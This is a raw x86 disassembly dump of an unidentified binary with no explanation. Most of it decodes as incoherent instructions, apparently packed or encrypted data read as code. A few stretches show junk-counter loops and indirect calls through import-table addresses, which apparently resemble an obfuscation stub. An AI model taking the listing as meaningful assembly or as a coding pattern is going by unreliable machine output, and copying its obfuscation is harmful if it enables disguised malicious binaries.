  409d50:	aaa    
  409d51:	pop    ebx
  409d52:	mov    ah,0x25
  409d54:	inc    eax
  409d55:	jbe    0x409dc2
  409d57:	inc    edx
  409d58:	ret    0x77da
  409d5b:	ret    
  409d5c:	ins    BYTE PTR es:[edi],dx
  409d5d:	in     al,dx
  409d5e:	sbb    edx,DWORD PTR [ebx+0x62e724e8]
  409d64:	ins    DWORD PTR es:[edi],dx
  409d65:	or     ch,BYTE PTR [edi]
  409d67:	cmp    bh,dh
  409d69:	pop    ebx
  409d6a:	lods   eax,DWORD PTR ds:[esi]
  409d6b:	rcl    DWORD PTR [esi-0x6c],1
  409d6e:	cmp    al,BYTE PTR [esi-0x2af38ec4]
  409d74:	xchg   edi,eax
  409d75:	lahf   
  409d76:	jg     0x409dc5
  409d78:	xor    DWORD PTR [ebx+ecx*8],ebx
  409d7b:	xor    eax,0x8075e730
  409d80:	pop    ebp
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433717,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	mov    edx,0x382520c8
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409de3
  409dcb:	(bad)  
  409dcc:	and    eax,0x30177388
  409dd1:	imul   edi,DWORD PTR [ecx-0x7],0x6229354a
  409dd8:	mov    cl,0xe4
  409ddb:	xchg   esp,eax
  409ddc:	mov    dh,0x1a
  409dde:	jg     0x409d68
  409de0:	xchg   BYTE PTR [edx-0x3cb65419],dh
  409de6:	mov    edi,0x4636628f
  409deb:	push   esp
  409dec:	fidivr DWORD PTR [edx]
  409dee:	(bad)  
  409def:	xchg   esi,eax
  409df0:	fcmovnu st,st(2)
  409df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409df3:	sub    BYTE PTR [ecx+ecx*1-0x75],dh
  409df7:	(bad)  
  409df8:	neg    cl
  409dfa:	pop    ebp
  409dfc:	outs   dx,DWORD PTR ds:[esi]
  409dfd:	popf   
  409dfe:	popf   
  409dff:	push   ebx
  409e00:	mov    esi,edx
  409e02:	sbb    eax,0x2978a31a
  409e07:	and    BYTE PTR [ebx+eax*2-0x1],0x6a
  409e0c:	popa   
  409e0d:	icebp  
  409e0e:	std    
  409e0f:	sub    eax,0x8ea3905d
  409e14:	xchg   edx,eax
  409e15:	fcomp  QWORD PTR [ecx-0x37]
  409e18:	mov    eax,0x8108ef38
  409e1d:	xchg   ebx,eax
  409e1e:	leave  
  409e1f:	out    dx,eax
  409e20:	jmp    0x409e89
  409e22:	sbb    dl,bh
  409e24:	sbb    esi,DWORD PTR [esi+eiz*1+0x807e9a1]
  409e2b:	(bad)  
  409e2c:	sbb    edx,DWORD PTR [edi+0x177ee0da]
  409e32:	enter  0x8586,0xa
  409e36:	cwde   
  409e37:	cmp    eax,0x61ee658b
  409e3c:	xchg   ebx,eax
  409e3d:	div    DWORD PTR [esi-0x7f9b004]
  409e43:	ins    BYTE PTR es:[edi],dx
  409e44:	lds    esp,FWORD PTR [esi-0x63]
  409e47:	push   0xfffffffb
  409e49:	pushf  
  409e4a:	adc    bh,dl
  409e4c:	hlt    
  409e4d:	ror    DWORD PTR [eax-0x76],cl
  409e50:	hlt    
  409e51:	loopne 0x409e30
  409e53:	push   ds
  409e54:	sbb    DWORD PTR [ecx+0x47],esi
  409e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e58:	pushf  
  409e59:	add    eax,0xa5461c38
  409e5e:	test   edi,ebx
  409e60:	in     al,dx
  409e61:	sub    al,BYTE PTR [eax]
  409e63:	jno    0x409eb3
  409e65:	mov    esp,0xa31d9553
  409e6a:	stos   BYTE PTR es:[edi],al
  409e6b:	hlt    
  409e6c:	scas   al,BYTE PTR es:[edi]
  409e6d:	push   edi
  409e6e:	std    
  409e6f:	int3   
  409e70:	sub    eax,0x759d45a4
  409e75:	push   ecx
  409e76:	sbb    BYTE PTR [esi+edx*8+0x2cde8ea9],ch
  409e7d:	mov    ds,eax
  409e7f:	lods   eax,DWORD PTR ds:[esi]
  409e80:	dec    edx
  409e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e82:	push   eax
  409e83:	mov    cl,0xdd
  409e85:	jge    0x409e15
  409e87:	pushf  
  409e88:	out    0xb7,al
  409e8a:	popa   
  409e8b:	gs inc ecx
  409e8d:	popa   
  409e8e:	jmp    0x409eb4
  409e90:	pop    ebx
  409e91:	jne    0x409ebc
  409e93:	lods   al,BYTE PTR ds:[esi]
  409e94:	or     DWORD PTR [edx+0x59],esp
  409e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e98:	out    dx,al
  409e99:	jne    0x409ee4
  409e9b:	call   0xac0f3b42
  409ea0:	adc    BYTE PTR [edi-0xc],ch
  409ea3:	aaa    
  409ea4:	test   DWORD PTR [ebp+0x54d9e83d],0xf037b668
  409eae:	je     0x409e9d
  409eb0:	jmp    0xa0224a4
  409eb5:	retf   0xd8a0
  409eb8:	addr16 jo 0x409edc
  409ebb:	mov    esp,0xed38f18e
  409ec0:	adc    eax,0x6259a2ff
  409ec5:	test   al,0x1c
  409ec7:	cli    
  409ec8:	ins    BYTE PTR es:[edi],dx
  409ec9:	int    0x70
  409ecb:	(bad)  
  409ecc:	gs dec dl
  409ecf:	push   0x2140084b
  409ed4:	dec    eax
  409ed5:	mov    DWORD PTR [eax+0x6e3e05d3],0xdea753b5
  409edf:	ret    0x662f
  409ee2:	xchg   BYTE PTR [esi+0x7f],ch
  409ee5:	in     al,0xbd
  409ee7:	mov    bh,0x8e
  409ee9:	cwde   
  409eea:	sar    BYTE PTR [esi+0x1c],cl
  409eed:	cdq    
  409eee:	mov    ebp,0xb83bef2e
  409ef3:	jnp    0x409ebb
  409ef5:	push   eax
  409ef6:	mov    ds:0x4ea049c,al
  409efb:	dec    esi
  409efc:	shl    BYTE PTR [ecx*1+0x656e38ba],1
  409f03:	xor    BYTE PTR [esp+eax*8],0xce
  409f07:	cli    
  409f08:	in     eax,dx
  409f09:	xchg   ecx,eax
  409f0a:	je     0x409efe
  409f0c:	dec    esi
  409f0d:	dec    ecx
  409f0e:	xchg   esp,eax
  409f0f:	lods   al,BYTE PTR ds:[esi]
  409f10:	mov    al,ds:0xb703c49a
  409f15:	and    al,0x27
  409f17:	cmp    eax,ebx
  409f19:	cdq    
  409f1a:	sti    
  409f1b:	adc    al,0xb1
  409f1d:	xlat   BYTE PTR ds:[ebx]
  409f1e:	mov    eax,ds:0xd35ec0aa
  409f23:	shr    ebx,1
  409f25:	dec    ebp
  409f26:	pop    esi
  409f27:	push   esi
  409f28:	sub    DWORD PTR gs:[edx+ecx*2+0x2ed4f609],ebp
  409f30:	push   esi
  409f31:	popa   
  409f32:	mov    ebp,0xd26a3df4
  409f37:	outs   dx,BYTE PTR ds:[esi]
  409f38:	sbb    bh,BYTE PTR [ebx-0x25242608]
  409f3e:	sub    BYTE PTR [edi-0x57fc0014],al
  409f44:	adc    BYTE PTR [eax+edi*4],bl
  409f47:	leave  
  409f48:	test   DWORD PTR [edx],ebp
  409f4a:	mov    ebx,0x6f43a7a9
  409f4f:	xlat   BYTE PTR ds:[ebx]
  409f50:	cld    
  409f51:	mov    ah,BYTE PTR [eax+0x5a]
  409f54:	inc    ebp
  409f55:	mov    dh,0xe9
  409f57:	pop    ss
  409f58:	mov    DWORD PTR [ebx+ecx*8],ebx
  409f5b:	arpl   WORD PTR [eax+0x3ba19ca0],bx
  409f61:	das    
  409f62:	cdq    
  409f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f64:	inc    ebp
  409f65:	adc    eax,0xa13b6401
  409f6a:	inc    ebp
  409f6b:	outs   dx,DWORD PTR ds:[esi]
  409f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f6d:	stos   DWORD PTR es:[edi],eax
  409f6e:	es or  al,bh
  409f71:	xchg   ebx,eax
  409f72:	or     DWORD PTR [ebp+0x585d6cb0],0xffffffe3
  409f79:	push   ecx
  409f7a:	dec    edi
  409f7b:	(bad)  
  409f7c:	stc    
  409f7d:	test   DWORD PTR [eax],esi
  409f7f:	cmp    eax,DWORD PTR [eax]
  409f81:	mov    edi,0x764adb55
  409f86:	xchg   edi,eax
  409f87:	cmp    BYTE PTR [ebp+ebp*8-0x355fa783],dh
  409f8e:	xchg   ebp,eax
  409f8f:	stos   BYTE PTR es:[edi],al
  409f90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f91:	fistp  QWORD PTR ds:0x2103b2f3
  409f97:	mov    bh,BYTE PTR [eax+esi*1+0x44]
  409f9b:	lea    edi,[eax]
  409f9d:	dec    esp
  409f9e:	pop    esi
  409f9f:	cmc    
  409fa0:	xlat   BYTE PTR ds:[ebx]
  409fa1:	adc    esi,DWORD PTR [ebp+eiz*1-0x56b453cb]
  409fa8:	stos   BYTE PTR es:[edi],al
  409fa9:	xchg   al,al
  409fab:	mov    bl,0xa1
  409fad:	out    dx,al
  409fae:	xchg   DWORD PTR [ecx],ebx
  409fb0:	les    edi,FWORD PTR [esi]
  409fb2:	js     0x409f5d
  409fb4:	inc    eax
  409fb5:	add    edx,edi
  409fb7:	sbb    ecx,DWORD PTR [esi]
  409fb9:	jge    0x409f7d
  409fbb:	pop    esp
  409fbc:	jmp    0x1409348e
  409fc1:	(bad)  
  409fc2:	push   DWORD PTR [ecx]
  409fc4:	xchg   esp,eax
  409fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc6:	lods   eax,DWORD PTR ds:[esi]
  409fc7:	sbb    eax,DWORD PTR [edi-0x36356248]
  409fcd:	arpl   sp,cx
  409fcf:	sub    ch,BYTE PTR [ebx+0x59c51a67]
  409fd5:	loopne 0x409f6a
  409fd7:	jnp    0x409f6e
  409fd9:	add    ecx,0x3cc9ae2a
  409fdf:	lods   eax,DWORD PTR ds:[esi]
  409fe0:	jb     0x40a024
  409fe2:	fiadd  DWORD PTR [ebp+0x107278d1]
  409fe8:	xor    ah,bl
  409fea:	push   edx
  409feb:	scas   al,BYTE PTR es:[edi]
  409fec:	fisubr WORD PTR [edx-0x7719eb6e]
  409ff2:	sti    
  409ff3:	in     al,dx
  409ff4:	mov    eax,0xcda7eed6
  409ff9:	jae    0x40a02c
  409ffb:	mov    al,0xa3
  409ffd:	sbb    DWORD PTR [esi],eax
  409fff:	cld    
  40a000:	enter  0xfd71,0xa8
  40a004:	les    esp,FWORD PTR [edi+eax*1+0x4d500d46]
  40a00b:	jmp    0xaf0f:0x86339b4a
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	div    al
  40a128:	scas   al,BYTE PTR es:[edi]
  40a129:	push   edi
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0c6
  40a133:	test   DWORD PTR [bx+si-0x14],ebx
  40a137:	shl    BYTE PTR ss:[edx],0x87
  40a13b:	dec    edx
  40a13c:	leave  
  40a13d:	mov    ah,dl
  40a13f:	scas   al,BYTE PTR es:[edi]
  40a140:	stos   BYTE PTR es:[edi],al
  40a141:	adc    al,0x40
  40a143:	mov    al,0x42
  40a145:	xchg   ecx,eax
  40a146:	add    DWORD PTR [esi-0x4d68a786],0x7ad1d3da
  40a150:	jg     0x40a18f
  40a152:	cmp    bl,BYTE PTR [esi+0x4c]
  40a155:	ins    BYTE PTR es:[edi],dx
  40a156:	push   eax
  40a157:	aaa    
  40a158:	inc    ebx
  40a159:	mov    ebx,0xde2295ea
  40a15e:	icebp  
  40a15f:	xor    DWORD PTR [edx],edi
  40a161:	pop    ecx
  40a162:	and    DWORD PTR [eax-0x5c],ebx
  40a165:	mov    ebp,0x855d0597
  40a16a:	repz mov dh,0xce
  40a16d:	inc    edx
  40a16e:	fs mov edi,0x7d64bc84
  40a174:	mov    cl,0x3b
  40a176:	imul   dl
  40a178:	out    0x52,eax
  40a17a:	(bad)  
  40a17c:	aam    0x61
  40a17e:	fwait
  40a17f:	sbb    edi,ecx
  40a181:	pop    esp
  40a182:	pop    edi
  40a183:	xlat   BYTE PTR ds:[ebx]
  40a184:	mov    edi,0x11c42ac2
  40a189:	les    edx,FWORD PTR [ecx-0x79]
  40a18c:	jne    0x40a182
  40a18e:	ds jb  0x40a126
  40a191:	(bad)  
  40a192:	out    dx,eax
  40a193:	mov    al,0xfb
  40a195:	jge    0x40a1be
  40a197:	mov    ss:0xe4dadb1f,eax
  40a19d:	(bad)  [esi]
  40a19f:	mov    ds:0xf71064fe,al
  40a1a4:	loopne 0x40a16f
  40a1a6:	rcr    DWORD PTR [ecx+0x35],0xb
  40a1aa:	mov    eax,ds:0x7488a942
  40a1af:	adc    BYTE PTR [ecx+0x6a],dl
  40a1b2:	xor    ebx,DWORD PTR [edx]
  40a1b4:	ja     0x40a169
  40a1b6:	inc    esp
  40a1b7:	loop   0x40a148
  40a1b9:	inc    ecx
  40a1ba:	out    0x19,al
  40a1bc:	adc    BYTE PTR [edi+edx*4+0xa],dl
  40a1c0:	push   0x8c4073bb
  40a1c5:	(bad)  
  40a1c6:	and    al,0xaa
  40a1c8:	out    dx,al
  40a1c9:	sub    al,0x95
  40a1cb:	jge    0x40a243
  40a1cd:	aaa    
  40a1ce:	(bad)  
  40a1d0:	mov    eax,0xbe5850ed
  40a1d5:	xor    esi,edi
  40a1d7:	mov    dh,cl
  40a1d9:	pop    ecx
  40a1da:	lods   al,BYTE PTR ds:[esi]
  40a1db:	fs shr ch,0xb9
  40a1df:	lods   al,BYTE PTR ds:[esi]
  40a1e0:	dec    esi
  40a1e1:	jb     0x40a209
  40a1e3:	and    BYTE PTR [esi+eiz*1],dh
  40a1e6:	loope  0x40a185
  40a1e8:	xchg   esi,eax
  40a1e9:	in     eax,dx
  40a1ea:	jle    0x40a242
  40a1ec:	test   DWORD PTR [edx-0x5a],edx
  40a1ef:	and    DWORD PTR [ecx],esi
  40a1f1:	fld    DWORD PTR [ebx]
  40a1f3:	fst    QWORD PTR [edi]
  40a1f5:	sbb    edx,ecx
  40a1f7:	nop
  40a1f8:	pop    ebp
  40a1f9:	scas   eax,DWORD PTR es:[edi]
  40a1fa:	jl     0x40a1e6
  40a1fc:	inc    ecx
  40a1fd:	pop    ebx
  40a1fe:	jg     0x40a1d5
  40a200:	fdivr  st,st(4)
  40a202:	js     0x40a205
  40a204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a205:	lea    edx,[edx-0x4343998c]
  40a20b:	mov    ah,BYTE PTR [ebp+0x5960b39b]
  40a211:	sub    al,0xca
  40a213:	mov    dh,0xc0
  40a215:	xor    DWORD PTR ds:0x232ac7c5,esp
  40a21b:	adc    edx,edi
  40a21d:	loope  0x40a218
  40a21f:	jmp    0xa9fb:0xa9c99783
  40a226:	enter  0xd461,0x35
  40a22a:	stos   DWORD PTR es:[edi],eax
  40a22b:	dec    ebx
  40a22c:	ds cmp eax,0xf9828813
  40a232:	push   cs
  40a233:	and    esi,esp
  40a235:	hlt    
  40a236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a237:	mov    dh,0xf
  40a239:	sbb    ah,BYTE PTR [edx-0x255c6956]
  40a23f:	shr    DWORD PTR [edx],cl
  40a241:	ins    DWORD PTR es:[edi],dx
  40a242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a243:	in     eax,0x21
  40a245:	(bad)  
  40a246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a247:	fsubr  st(2),st
  40a249:	repz pop ds
  40a24b:	add    al,0x71
  40a24d:	mov    al,ds:0x3398cec9
  40a252:	or     eax,0xc3a752c9
  40a257:	pop    esi
  40a258:	icebp  
  40a259:	fimul  DWORD PTR [ecx+0x18]
  40a25c:	jae    0x40a211
  40a25e:	mov    al,0xe7
  40a260:	(bad)  
  40a262:	leave  
  40a263:	and    DWORD PTR [eax],0xffffff92
  40a266:	dec    ebp
  40a267:	pop    ss
  40a268:	sbb    bl,BYTE PTR [edi]
  40a26a:	aad    0x4f
  40a26c:	xor    edi,esi
  40a26e:	push   cs
  40a26f:	push   0x29
  40a271:	or     BYTE PTR [edi-0x2a38c998],dl
  40a277:	test   DWORD PTR [ecx+ecx*8-0x7a],ecx
  40a27b:	dec    eax
  40a27c:	mul    BYTE PTR [ecx-0x38]
  40a27f:	inc    edi
  40a280:	(bad)  
  40a281:	xor    cl,bh
  40a283:	leave  
  40a284:	jecxz  0x40a278
  40a286:	jb     0x40a29e
  40a288:	fst    QWORD PTR [eax]
  40a28a:	hlt    
  40a28b:	xlat   BYTE PTR ds:[ebx]
  40a28c:	scas   al,BYTE PTR es:[edi]
  40a28d:	pusha  
  40a28e:	icebp  
  40a28f:	data16 and BYTE PTR [eax+0x7b],dh
  40a293:	mov    eax,0xb99de484
  40a298:	retf   
  40a299:	aad    0x10
  40a29b:	fiadd  WORD PTR [eax-0x1143d15a]
  40a2a1:	and    al,0x2f
  40a2a3:	xor    eax,0xa2d7b41d
  40a2a8:	aad    0x50
  40a2aa:	jno    0x40a2f4
  40a2ac:	cli    
  40a2ad:	dec    esi
  40a2ae:	pushf  
  40a2af:	retf   0x589e
  40a2b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2b3:	adc    BYTE PTR [ecx+0x7de190ce],ch
  40a2b9:	or     ebx,esp
  40a2bb:	stos   BYTE PTR es:[edi],al
  40a2bc:	adc    ecx,esp
  40a2be:	sub    al,0x39
  40a2c0:	(bad)  
  40a2c1:	stc    
  40a2c2:	clc    
  40a2c3:	jns    0x40a282
  40a2c5:	xor    esp,DWORD PTR [edx+0x37]
  40a2c8:	sub    al,0x6d
  40a2ca:	fbstp  TBYTE PTR [eax+0x55c495a1]
  40a2d0:	fmul   QWORD PTR es:[ecx]
  40a2d3:	dec    edi
  40a2d4:	cwde   
  40a2d5:	arpl   WORD PTR [eax],di
  40a2d7:	outs   dx,DWORD PTR ds:[esi]
  40a2d8:	scas   eax,DWORD PTR es:[edi]
  40a2d9:	push   ecx
  40a2da:	adc    DWORD PTR [ebp+0x2d],edx
  40a2dd:	mov    al,0x94
  40a2df:	xchg   esp,eax
  40a2e0:	scas   eax,DWORD PTR es:[edi]
  40a2e1:	daa    
  40a2e2:	mov    ebp,0xc72d2990
  40a2e7:	sbb    ecx,0xffffffa2
  40a2ea:	and    BYTE PTR [esi-0x3e],cl
  40a2ed:	push   ds
  40a2ee:	arpl   bp,bx
  40a2f0:	xchg   ebx,eax
  40a2f1:	jb     0x40a295
  40a2f3:	sbb    al,0xe7
  40a2f5:	dec    eax
  40a2f6:	push   ds
  40a2f7:	jne    0x40a2e5
  40a2f9:	ins    BYTE PTR es:[edi],dx
  40a2fa:	push   es
  40a2fb:	adc    BYTE PTR [edx],ah
  40a2fd:	or     al,0x78
  40a2ff:	mov    esi,0x39b23e76
  40a304:	fld    TBYTE PTR [edi-0x218862e4]
  40a30a:	mov    eax,ds:0x14da97bd
  40a30f:	imul   eax,DWORD PTR [edi+0x21],0xc
  40a313:	jmp    0x2253:0x5c5ca6d2
  40a31a:	dec    ebp
  40a31b:	aad    0x7c
  40a31d:	jae    0x40a303
  40a31f:	xchg   esi,eax
  40a320:	jmp    0x40a2cc
  40a322:	nop
  40a323:	xor    BYTE PTR [eax+0x46],dl
  40a326:	sbb    eax,0x45500dc0
  40a32b:	adc    BYTE PTR [edi-0x754b512],0xd3
  40a332:	(bad)  
  40a333:	sbb    al,BYTE PTR [ebx-0x3b948bf7]
  40a339:	jmp    0x40a2d2
  40a33b:	add    DWORD PTR [ebp-0x27],esi
  40a33e:	int    0xb5
  40a340:	in     eax,dx
  40a341:	lods   al,BYTE PTR ds:[esi]
  40a342:	push   ss
  40a343:	out    0x32,eax
  40a345:	mov    edi,ebp
  40a347:	(bad)  
  40a348:	leave  
  40a349:	retf   
  40a34a:	cli    
  40a34b:	ins    BYTE PTR es:[edi],dx
  40a34c:	dec    esi
  40a34d:	(bad)  
  40a34f:	mov    ch,0xde
  40a351:	aas    
  40a352:	out    0x46,eax
  40a354:	popa   
  40a355:	shl    DWORD PTR [esi-0x2dc52c86],cl
  40a35b:	jnp    0x40a328
  40a35d:	xchg   edx,eax
  40a35e:	inc    esi
  40a35f:	dec    ebx
  40a360:	push   eax
  40a361:	lods   al,BYTE PTR ds:[esi]
  40a362:	ds iret 
  40a364:	nop
  40a365:	xor    BYTE PTR ds:0x8096139b,dl
  40a36b:	ja     0x40a308
  40a36d:	xchg   ecx,eax
  40a36e:	cdq    
  40a36f:	outs   dx,DWORD PTR ds:[esi]
  40a370:	jp     0x40a389
  40a372:	jl     0x40a34c
  40a374:	cmp    al,0x42
  40a376:	sbb    BYTE PTR [ebx+ecx*4+0x4d],dl
  40a37a:	call   0x25c26bb2
  40a37f:	sti    
  40a380:	ss inc ebx
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    BYTE PTR [eax],al
  40a386:	add    cl,ch
  40a388:	push   cs
  40a389:	add    BYTE PTR [eax],al
  40a38b:	add    BYTE PTR [ebx],dh
  40a38d:	shl    BYTE PTR [ebx],0x5
  40a390:	sti    
  40a391:	ss inc ebx
  40a393:	add    BYTE PTR [eax-0x5d],al
  40a396:	sti    
  40a397:	ss inc ebx
  40a399:	add    BYTE PTR [ebx+0x4336fb3d],al
  40a39f:	add    BYTE PTR [esi],dl
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	pop    ss
  40a49c:	sbb    DWORD PTR [esi+0x7eee4ce5],0x7e7c387e
  40a4a6:	jle    0x40a51f
  40a4a8:	sbb    BYTE PTR [esi-0x32],ah
  40a4ab:	shr    BYTE PTR [eax+0x43],0x83
  40a4af:	sbb    al,0xd
  40a4b1:	add    dh,ah
  40a4b3:	inc    ebx
  40a4b4:	push   edi
  40a4b5:	js     0x40a448
  40a4b7:	dec    eax
  40a4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4b9:	(bad)  
  40a4bb:	(bad)  
  40a4bc:	ins    DWORD PTR es:[edi],dx
  40a4bd:	pushf  
  40a4be:	repz jmp 0x78c9:0x1ea16ad4
  40a4c6:	jno    0x40a4be
  40a4c8:	inc    edx
  40a4c9:	and    DWORD PTR [esi+esi*4+0x707a4071],ebp
  40a4d0:	jne    0x40a46b
  40a4d2:	sub    DWORD PTR [esi-0x2e544fe9],esp
  40a4d8:	mul    DWORD PTR [ecx]
  40a4da:	mul    DWORD PTR [ebx-0x4f1b4bc0]
  40a4e0:	fistp  DWORD PTR [eax+ecx*4+0x5cb7f42]
  40a4e7:	push   ebp
  40a4e8:	jecxz  0x40a4e2
  40a4ea:	call   0x4475:0x25985cae
  40a4f1:	adc    eax,0xb7fbd94b
  40a4f6:	jge    0x40a4be
  40a4f8:	sub    dh,BYTE PTR [eax]
  40a4fa:	mov    ebp,0x355fb06e
  40a4ff:	iret   
  40a500:	imul   esp,DWORD PTR [eax],0xffffffc7
  40a503:	lods   al,BYTE PTR ds:[esi]
  40a504:	inc    esi
  40a505:	loope  0x40a540
  40a507:	(bad)  
  40a508:	add    al,0xd1
  40a50a:	nop
  40a50b:	std    
  40a50c:	or     BYTE PTR [eax-0x1],bh
  40a50f:	pop    ebp
  40a510:	mov    bl,0x86
  40a512:	jp     0x40a556
  40a514:	jnp    0x40a571
  40a516:	add    al,0xdf
  40a518:	mov    ds:0xd360ec3,al
  40a51d:	sbb    bh,BYTE PTR [edx-0xc]
  40a520:	xchg   DWORD PTR [ebx+0x1a],esi
  40a523:	int    0xdc
  40a525:	pop    edi
  40a526:	adc    BYTE PTR [ebp+0x16],bh
  40a529:	mov    bl,0xd6
  40a52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a52c:	mov    bh,0xcb
  40a52e:	fisttp QWORD PTR [eax+ebx*2-0x78]
  40a532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a533:	xchg   BYTE PTR [ecx-0x63],cl
  40a536:	pop    ecx
  40a537:	leave  
  40a538:	push   0x48
  40a53a:	adc    eax,0x2024d696
  40a53f:	pop    ebp
  40a540:	scas   al,BYTE PTR es:[edi]
  40a541:	xchg   BYTE PTR [esi],dl
  40a543:	shl    esp,1
  40a545:	(bad)  
  40a546:	mov    ecx,0x4a3b0ed3
  40a54b:	bound  ebx,QWORD PTR [eax+ecx*1-0x27]
  40a54f:	pop    edx
